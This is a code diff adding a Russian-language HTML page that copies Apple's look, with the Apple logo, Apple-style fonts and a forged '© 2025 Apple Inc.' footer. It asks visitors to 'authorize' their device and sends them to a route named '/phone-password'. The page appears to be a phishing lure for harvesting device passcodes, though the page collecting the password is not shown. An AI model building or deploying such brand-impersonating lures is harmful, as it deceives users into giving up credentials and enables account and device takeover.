@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Авторизация устройства</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      background-color: #000;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      width: 360px;
+      padding: 40px 20px 60px;
+      text-align: center;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .apple-logo {
+      width: 48px;
+      height: auto;
+      margin: 0 auto 20px;
+      display: block;
+    }
+    .invert {
+      filter: invert(1);
+    }
+    h2 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+    p {
+      color: #ccc;
+      font-size: 16px;
+      margin-bottom: 40px;
+    }
+    .btn-main {
+      padding: 14px 24px;
+      font-size: 17px;
+      font-weight: 600;
+      color: #000;
+      background-color: #fff;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+    }
+    .btn-main:hover {
+      background-color: #e2e2e2;
+    }
+    .footer {
+      font-size: 13px;
+      color: #666;
+      text-align: center;
+      padding: 20px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="apple-logo invert" />
+    <h2>Управление устройством</h2>
+    <p>Для продолжения необходимо авторизироваться.</p>
+    <form action="/phone-password" method="get">
+      <button class="btn-main" type="submit">Авторизироваться</button>
+    </form>
+  </div>
+  <div class="footer">
+    © 2025 Apple Inc. Все права защищены.
+  </div>
+</body>
+</html>
